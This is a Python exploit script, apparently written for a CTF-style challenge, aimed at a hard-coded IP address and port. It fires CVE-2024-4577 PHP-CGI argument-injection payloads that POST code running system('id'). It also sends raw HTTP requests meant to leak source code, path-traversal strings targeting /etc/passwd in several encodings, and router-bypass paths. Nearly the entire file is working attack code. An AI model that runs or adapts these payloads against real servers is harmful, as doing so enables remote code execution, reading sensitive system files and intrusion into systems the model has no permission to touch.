#!/usr/bin/env python3
"""
PHP Built-in Server Source Code Disclosure (CVE-2024-4577 and similar)
Testing various methods to leak PHP source code
"""
import requests
import socket
import urllib.parse

target = "http://61.147.171.35:53451/"
target_host = "61.147.171.35"
target_port = 53451

def test_cgi_mode():
    """Test if running in CGI mode - CVE-2024-4577"""
    print("Testing CGI mode (CVE-2024-4577)...")
    
    # CVE-2024-4577 affects Windows systems with specific locales
    # Uses soft hyphen (0xAD) which is treated as hyphen by Windows
    
    # Test payloads
    payloads = [
        # Standard CGI argument injection
        "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
        "/?-d+allow_url_include=1+-d+auto_prepend_file=php://input",
        # With POST body containing PHP code
    ]
    
    for payload in payloads:
        url = target + payload
        try:
            # POST with PHP code
            r = requests.post(url, data="<?php system('id'); ?>", timeout=5)
            if "uid=" in r.text or "www-data" in r.text:
                print(f"[+] RCE via CGI: {payload}")
                print(f"    Response: {r.text}")
                return True
            elif r.text != "Hello World!\n":
                print(f"[?] Different response: {payload}")
                print(f"    {r.text[:100]}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

def test_source_disclosure_raw():
    """Test source disclosure via raw HTTP request manipulation"""
    print("\nTesting source disclosure via raw requests...")
    
    # PHP built-in server might expose source with certain request patterns
    raw_requests = [
        # Request for .phps extension (if enabled)
        b"GET /index.phps HTTP/1.1\r\nHost: 61.147.171.35:51810\r\n\r\n",
        
        # Request with Accept header for text/plain
        b"GET /index.php HTTP/1.1\r\nHost: 61.147.171.35:51810\r\nAccept: text/plain\r\n\r\n",
        
        # Request with wrong Content-Type
        b"GET /index.php HTTP/1.1\r\nHost: 61.147.171.35:51810\r\nContent-Type: text/plain\r\n\r\n",
        
        # Range header to get partial content
        b"GET /index.php HTTP/1.1\r\nHost: 61.147.171.35:51810\r\nRange: bytes=0-100\r\n\r\n",
        
        # HEAD then GET pipeline
        b"HEAD /index.php HTTP/1.1\r\nHost: 61.147.171.35:51810\r\n\r\nGET /index.php HTTP/1.0\r\n\r\n",
        
        # Request with suspicious path
        b"GET /index.php%00.txt HTTP/1.1\r\nHost: 61.147.171.35:51810\r\n\r\n",
        
        # WebDAV methods
        b"PROPFIND / HTTP/1.1\r\nHost: 61.147.171.35:51810\r\nDepth: 1\r\n\r\n",
    ]
    
    for i, req in enumerate(raw_requests):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_host, target_port))
            sock.send(req)
            response = sock.recv(8192)
            sock.close()
            
            # Check for PHP source code signatures
            if b"<?php" in response or b"<?" in response:
                print(f"[+] SOURCE FOUND in request {i}!")
                print(response.decode('utf-8', errors='ignore'))
                return True
            elif b"Hello World" not in response and b"404" not in response:
                print(f"[?] Different response for request {i}:")
                print(response[:500])
        except Exception as e:
            print(f"[-] Request {i} error: {e}")
    
    return False

def test_conditional_requests():
    """Test with If-* headers that might affect behavior"""
    print("\nTesting conditional requests...")
    
    headers_list = [
        {"If-None-Match": "*"},
        {"If-Modified-Since": "Sat, 29 Oct 1994 19:43:31 GMT"},
        {"If-Match": "*"},
        {"If-Unmodified-Since": "Sat, 29 Oct 1994 19:43:31 GMT"},
        {"If-Range": "bytes=0-100"},
    ]
    
    for headers in headers_list:
        try:
            r = requests.get(target + "/index.php", headers=headers, timeout=5)
            if r.status_code != 200 or r.text != "Hello World!\n":
                print(f"[?] {headers}: Status={r.status_code}, Content={r.text[:50]}")
        except:
            pass

def test_path_traversal_in_uri():
    """Test path traversal within URI"""
    print("\nTesting path traversal in URI...")
    
    # Various encoding levels
    traversals = [
        "../" * 10 + "etc/passwd",
        "..%2f" * 10 + "etc/passwd",
        "..%252f" * 10 + "etc/passwd",  # Double encoding
        "%2e%2e%2f" * 10 + "etc/passwd",
        "..\\",  # Backslash
        "..%5c" * 10 + "etc/passwd",
        ".%00./etc/passwd",
        "..%c0%af" * 10 + "etc/passwd",  # UTF-8 overlong encoding
        "..%c1%9c" * 10 + "etc/passwd",
    ]
    
    for trav in traversals:
        url = target + "/" + trav
        try:
            r = requests.get(url, timeout=3)
            if "root:" in r.text:
                print(f"[+] Path traversal works: {trav}")
                print(r.text[:200])
        except:
            pass

def test_router_bypass():
    """Test bypassing router.php (if any)"""
    print("\nTesting router bypass...")
    
    # PHP built-in server can use router.php
    # Try to access files directly
    
    paths = [
        "/./index.php",
        "/../index.php",
        "/index.php/../../index.php",
        "/.//index.php",
        "/;/index.php",
        "/@/index.php",
        "/!/index.php",
        "/#/index.php",
        "/%/index.php",
    ]
    
    for path in paths:
        url = target + path
        try:
            r = requests.get(url, timeout=3)
            # Look for any difference
            if r.text != "Hello World!\n" and "Hello World" not in r.text:
                print(f"[?] {path}: {r.text[:100]}")
        except:
            pass

if __name__ == "__main__":
    print(f"Target: {target}")
    print("=" * 60)
    
    test_cgi_mode()
    test_source_disclosure_raw()
    test_conditional_requests()
    test_path_traversal_in_uri()
    test_router_bypass()
    
    print("\nDone.")
